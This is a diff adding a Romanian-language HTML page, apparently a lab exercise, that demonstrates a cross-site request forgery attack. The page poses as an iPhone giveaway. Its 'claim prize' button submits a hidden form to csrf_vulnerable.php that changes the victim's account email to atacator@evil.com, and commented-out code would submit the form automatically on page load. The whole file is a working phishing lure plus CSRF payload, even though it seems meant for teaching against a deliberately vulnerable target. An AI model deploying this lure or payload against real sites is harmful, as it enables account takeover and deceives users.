@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="ro">
+<head>
+    <meta charset="UTF-8">
+    <title>Castiga un iPhone!</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding-top: 50px; }
+        .win-box { border: 2px solid #e74c3c; padding: 20px; display: inline-block; border-radius: 10px; }
+        button { background: #e74c3c; color: white; border: none; padding: 10px 20px; font-size: 18px; cursor: pointer; border-radius: 5px; }
+    </style>
+</head>
+<body>
+    <div class="win-box">
+        <h1>FELICITARI!</h1>
+        <p>Ai fost selectat pentru a castiga un iPhone 15 Pro!</p>
+        <p>Apasa pe butonul de mai jos pentru a-ti revendica premiul:</p>
+        
+        <!-- Formularul de atac CSRF -->
+        <!-- NOTA: Schimbati 'localhost:8080' cu adresa reala a serverului daca testati pe SCS -->
+        <form id="csrf-form" action="csrf_vulnerable.php" method="POST">
+            <input type="hidden" name="change_email" value="1">
+            <input type="hidden" name="email" value="atacator@evil.com">
+            <button type="submit">REVENDICA PREMIUL ACUM!</button>
+        </form>
+    </div>
+
+    <script>
+        // In un atac real, am putea folosi auto-submit:
+        // window.onload = function() {
+        //     document.getElementById('csrf-form').submit();
+        // };
+    </script>
+</body>
+</html>
